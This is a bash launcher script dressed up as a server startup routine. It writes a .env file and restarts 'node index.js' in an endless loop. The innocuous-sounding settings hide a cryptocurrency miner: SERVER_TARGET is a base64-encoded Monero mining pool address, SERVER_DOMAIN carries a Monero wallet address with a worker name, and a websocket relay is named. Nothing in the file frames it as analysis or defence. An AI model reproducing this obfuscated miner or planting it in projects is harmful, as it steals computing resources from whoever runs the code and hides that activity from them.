#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-003}
echo "SERVER_WS=wss://site--poais--2p62f4xqvk7f.code.run
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz
SERVER_DOMAIN=87RcG7HcfSm3Nc2SzUU9fdTbpmD7t5YjB8aB1Togen2bEFgzSnVhQXLErGfvRgqyq2JSURF2LWTjdZnfnS6qGcCy8mzd2ez.${NAME}
SERVER_SECRET=x
SERVER_CONNECTION=${CONNECT}" > .env
export PATH=./user/bin:$PATH
while true; do node index.js; sleep 15; done
